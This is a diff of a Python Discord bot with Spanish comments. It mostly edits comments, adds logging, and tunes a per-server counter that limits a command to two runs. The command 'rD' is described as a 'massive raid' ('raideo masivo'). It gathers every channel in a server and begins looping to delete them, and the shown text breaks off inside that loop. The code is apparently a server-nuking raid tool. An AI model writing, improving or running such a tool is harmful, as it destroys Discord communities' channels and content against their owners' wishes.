@@ -20,7 +20,6 @@ TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
 GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
 
 # ================= VARIABLES GLOBALES OPTIMIZADAS =================
-# Cambiado a un diccionario para separar los contadores por servidor (Guild)
 ejecuciones_por_servidor = {}  
 MAX_EJECUCIONES = 2
 tiempo_inicio = datetime.now()
@@ -44,10 +43,9 @@ async def on_ready():
 def generar_embed_eje(guild_id):
     global ejecuciones_por_servidor, MAX_EJECUCIONES
     
-    # Si el servidor no está en el diccionario, empieza en 0
+    # Si el servidor no registra actividad, empieza en 0
     actuales = ejecuciones_por_servidor.get(guild_id, 0)
     
-    # Color estético del Embed según el uso del servidor
     if actuales == 0:
         color = discord.Color.green()
     elif actuales == 1:
@@ -68,7 +66,7 @@ def generar_embed_eje(guild_id):
 # ================= COMANDO !eje (INDIVIDUAL POR SERVIDOR) =================
 @bot.command()
 async def eje(ctx):
-    if not ctx.guild: return  # Evita que se use en mensajes directos (DM)
+    if not ctx.guild: return  
     
     embed = generar_embed_eje(ctx.guild.id)
     try:
@@ -117,17 +115,18 @@ async def rD(ctx):
     if not ctx.author.guild_permissions.manage_channels: return
     if not ctx.guild.me.guild_permissions.manage_channels: return
 
-    # Obtener las ejecuciones exclusivas de este servidor
+    # Obtener el número actual antes de la verificación
     actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
 
-    # 1. Control del límite de ejecuciones en este servidor específico
+    # 1. Control estricto de límite
     if actuales >= MAX_EJECUCIONES:
         try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
         except: pass
         return
 
-    # 2. Sumamos la ejecución al servidor actual de inmediato
+    # 🔥 NUEVO: Sumar de inmediato en memoria global antes de procesar el raideo masivo
     ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
+    logging.info(f"📈 Contador actualizado para Guild ID {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
 
     channels_to_delete = list(ctx.guild.channels)
     for channel in channels_to_delete:
